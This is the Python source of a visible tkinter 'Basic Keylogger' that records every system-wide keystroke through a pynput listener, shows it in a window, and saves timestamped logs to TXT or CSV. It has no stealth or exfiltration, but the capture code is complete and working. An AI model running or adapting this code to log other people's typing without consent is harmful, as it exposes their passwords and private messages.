import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard
import threading
import time
import csv

# Global variables
key_log = []  # To store key logs
listener = None  # Listener object
is_logging = False  # Logging state


def start_keylogger():
    """Start the keylogger."""
    global listener, is_logging
    if is_logging:
        messagebox.showinfo("Info", "Keylogger is already running!")
        return

    is_logging = True
    display_log("Keylogger started...\n")
    listener = keyboard.Listener(on_press=log_key)
    threading.Thread(target=listener.start, daemon=True).start()


def stop_keylogger():
    """Stop the keylogger."""
    global listener, is_logging
    if not is_logging:
        messagebox.showinfo("Info", "Keylogger is not running!")
        return

    is_logging = False
    if listener:
        listener.stop()
    display_log("Keylogger stopped.\n")


def log_key(key):
    """Log the key pressed and display it in real time."""
    try:
        # Capture alphanumeric keys
        key_str = key.char
    except AttributeError:
        # Capture special keys
        key_str = f"[{key}]"

    # Add key press to log
    timestamp = time.ctime()
    key_log.append((timestamp, key_str))
    display_log(f"{timestamp} - {key_str}\n")


def display_log(message):
    """Display log messages in the GUI."""
    log_textbox.insert(tk.END, message)
    log_textbox.see(tk.END)  # Auto-scroll


def save_logs():
    """Save logs to a file in TXT or CSV format."""
    if not key_log:
        messagebox.showwarning("Warning", "No logs to save!")
        return

    # Prompt the user to choose a file format and location
    file_path = filedialog.asksaveasfilename(
        title="Save Logs",
        filetypes=(("Text Files", "*.txt"), ("CSV Files", "*.csv")),
        defaultextension=".txt",
    )

    if file_path.endswith(".txt"):
        with open(file_path, "w") as file:
            for timestamp, key in key_log:
                file.write(f"{timestamp} - {key}\n")
    elif file_path.endswith(".csv"):
        with open(file_path, "w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(["Timestamp", "Key"])
            writer.writerows(key_log)

    messagebox.showinfo("Info", f"Logs saved to {file_path}")


def clear_logs():
    """Clear logs from the GUI and memory."""
    global key_log
    key_log = []
    log_textbox.delete(1.0, tk.END)
    display_log("Logs cleared.\n")


# GUI setup
root = tk.Tk()
root.title("Basic Keylogger")
root.geometry("600x400")
root.resizable(False, False)

# GUI widgets
log_textbox = tk.Text(root, wrap="word", height=15, width=70, state="normal")
log_textbox.pack(pady=10)

button_frame = tk.Frame(root)
button_frame.pack(pady=10)

start_button = tk.Button(button_frame, text="Start Keylogger", command=start_keylogger, bg="green", fg="white", width=15)
start_button.grid(row=0, column=0, padx=5)

stop_button = tk.Button(button_frame, text="Stop Keylogger", command=stop_keylogger, bg="red", fg="white", width=15)
stop_button.grid(row=0, column=1, padx=5)

save_button = tk.Button(button_frame, text="Save Logs", command=save_logs, bg="blue", fg="white", width=15)
save_button.grid(row=0, column=2, padx=5)

clear_button = tk.Button(button_frame, text="Clear Logs", command=clear_logs, bg="orange", fg="white", width=15)
clear_button.grid(row=0, column=3, padx=5)

# Start the GUI loop
root.mainloop()
